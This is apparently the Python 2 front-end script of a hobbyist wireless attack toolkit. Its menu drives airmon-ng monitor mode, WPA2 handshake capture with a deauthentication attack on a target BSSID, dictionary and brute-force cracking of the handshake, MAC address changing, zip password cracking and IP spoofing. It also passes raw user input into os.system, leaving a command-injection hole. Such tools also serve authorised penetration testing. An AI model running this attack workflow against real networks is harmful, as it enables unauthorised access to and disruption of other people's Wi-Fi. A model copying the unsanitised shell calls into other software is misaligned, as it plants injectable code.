from termcolor import colored
from Wpa2 import *
from AirCracker import *
from threading import Thread
import time, sys
import zipCrack
import ipSpoofer
from macChannger import *
logo = '''   
          welcome to                                                                                 
                      `-------`  -------       `---`                  -`            ``                      
                      /M++++++.  ++++sNd     `hho+ody                 o.            N/                      
                      /M            /m+      -M/.       +dyhd-  syhy` m:  myyydo  yyMdd-                     
                      /Myyyyyy    .hh.        `/oyyho` -M.      yd    M/  Mo  .M-   M/                      
                      /M         +m/                dy -M.      yy    M/  M+  .M-   M/ ,                     
                      /Myyyyyy +sMhyyyyy-    `ohhyyhy.  +dyyd/  yy    M/  Mhyyd+    dd::                     
                       ```````  ```````        ```      ``        `       M/  ``     `                      
                                                                          s-                              
                                                                                       '''
print colored(logo, 'red')


while True:
    print"\n"
    print "\t\t################################################"
    print "\t\t#                  CHOICES                     #"
    print "\t\t################################################"
    print "\t\t#        [1] Toggle network card mode          #"
    print "\t\t#        [2] Wpa2 handshake capture            #"
    print "\t\t#        [3] crack Wpa2 handshake              #"
    print "\t\t#        [4] change mac address/macChanger     #"
    print "\t\t#        [5] Crack zip file password           #"
    print "\t\t#        [6] IP spoofer                        #"
    print "\t\t#        [0] Exit                              #"

    while True:
        try:
            choice = input("\n\nEnter your choice: ")
            break
        except NameError:
            print "Invalid choice!!"
        except KeyboardInterrupt:
            print "Keyboard Interrupt occurred! system will now exit..."
            time.sleep(1)
            sys.exit(0)

    if choice == 1:
        interface = raw_input("Enter the interface: ")
        if interface[-3::1] != "mon":
            mon = "airmon-ng start " + interface
            os.system(mon)
            print interface + "is now in monitor mode with name " + interface + "mon"
        else:
            mon = "airmon-ng stop " + interface
            os.system(mon)
            print interface + "is now in managed mode with name " + interface[:len(interface)-3]

    elif choice == 2:
        Wpa2.checkKill()
        interface = raw_input("\t\tEnter the name of the interface: ")
        mon = "airmon-ng start " + interface
        os.system(mon)
        print "\t\t\t\tPress ctrl+c to stop scanning...."
        time.sleep(3)
        S = Thread(target=Wpa2.Scan)
        S.start()
        try:
            while True:
                c = raw_input()
                if c.lower() == "q":
                    Wpa2.procc.terminate()
                    Wpa2.procc = None
        except KeyboardInterrupt:
            Wpa2.procc.terminate()
            Wpa2.procc = None
        bssid = raw_input("\n\nEnter the bssid of the WiFi you want to attack: ")
        channel = raw_input("Enter it's channel number: ")
        while True:
            try:
                fileName = raw_input("Enter filename to save the handshake: ")
                file = open(fileName + "-01.cap", 'r')
                print "filename already in use.."
            except:
                break

        W = Wpa2(bssid, channel, fileName, interface)
        print "\t\t\t\tPress ctrl+c to stop scanning...."
        time.sleep(3)
        SS = Thread(target=W.specificScan())
        SS.start()
        time.sleep(2)
        W.Deauth()
        try:
            while True:
                c = raw_input()
                if c.lower() == "q":
                    Wpa2.procc.terminate()
                    Wpa2.procc = None
        except KeyboardInterrupt:
            Wpa2.procc.terminate()
            Wpa2.procc = None
        os.system('clear')
        print"\n\n\n\n\n\n\n\n"
        print "\t\t################################################"
        print "\t\t#                  CHOICES                     #"
        print "\t\t################################################"
        print "\t\t#        [1] Dictionary Attack                 #"
        print "\t\t#        [2] Brute Force Attack                #"

        choice = input("Enter your choice: ")
        temp = fileName + "-01.cap"
        fileName = temp

        if choice == 1:

            A = AirCracker(fileName)
            AT = Thread(target=A.dictionary)
            AT.start()
            try:
                while True:
                    c = raw_input()
                    if c.lower() == "q":
                        AirCracker.procc.terminate()
                        AirCracker.procc = None
            except KeyboardInterrupt:
                AirCracker.procc.terminate()
                AirCracker.procc = None
        elif choice == 2:
            A = AirCracker(fileName)
            AT = Thread(target=A.bruteForce)
            AT.start()
            try:
                while True:
                    c = raw_input()
                    if c.lower() == "q":
                        AirCracker.procc.terminate()
                        AirCracker.procc = None
            except KeyboardInterrupt:
                AirCracker.procc.terminate()
                AirCracker.procc = None
        else:
            pass

        os.system('airmon-ng stop ' + interface + " ; service NetworkManager start")

    elif choice == 3:
        print "\t\t################################################"
        print "\t\t#                  CHOICES                     #"
        print "\t\t################################################"
        print "\t\t#        [1] Dictionary Attack                 #"
        print "\t\t#        [2] Brute Force Attack                #"

        choice = input("Enter your choice: ")
        fileName = raw_input("Enter file name:")
        temp = fileName + "-01.cap"
        fileName = temp

        if choice == 1:

            A = AirCracker(fileName)
            AT = Thread(target=A.dictionary)
            AT.start()
            try:
                while True:
                    c = raw_input()
                    if c.lower() == "q":
                        AirCracker.procc.terminate()
                        AirCracker.procc = None
            except KeyboardInterrupt:
                AirCracker.procc.terminate()
                AirCracker.procc = None
            print "Done"
        elif choice == 2:
            A = AirCracker(fileName)
            AT = Thread(target=A.bruteForce)
            AT.start()
            try:
                while True:
                    c = raw_input()
                    if c.lower() == "q":
                        AirCracker.procc.terminate()
                        AirCracker.procc = None
            except KeyboardInterrupt:
                AirCracker.procc.terminate()
                AirCracker.procc = None
        else:
            pass

    elif choice == 4:
        os.system('clear')
        print "\t\t################################################"
        print "\t\t#                  CHOICES                     #"
        print "\t\t################################################"
        print "\t\t#        [1] Display current mac address       #"
        print "\t\t#        [2] Get random mac address            #"
        print "\t\t#        [3] reset to permanent mac address    #"
        print "\t\t#        [4] list vendor addresses             #"
        print "\t\t#        [5] set mac address manually          #"
        print "\t\t#        [0] Go Back                           #"
        choice = input("Enter your choice: ")
        if choice == 1:
            macChanger.current()
        elif choice == 2:
            macChanger.randomT()
        elif choice == 3:
            macChanger.reset()
        elif choice == 4:
            macChanger.listV()
        elif choice == 5:
            macChanger.manual()
        else:
            os.system('clear')
            print colored(logo, 'red')
            pass

    elif choice == 5:
        zipCrack.zipCrack()
        print colored(logo, 'red')

    elif choice == 6:
        ipSpoofer.spoofMain()
        os.system('clear')
        print colored(logo, 'red')

    else:
        os.system('clear')
        break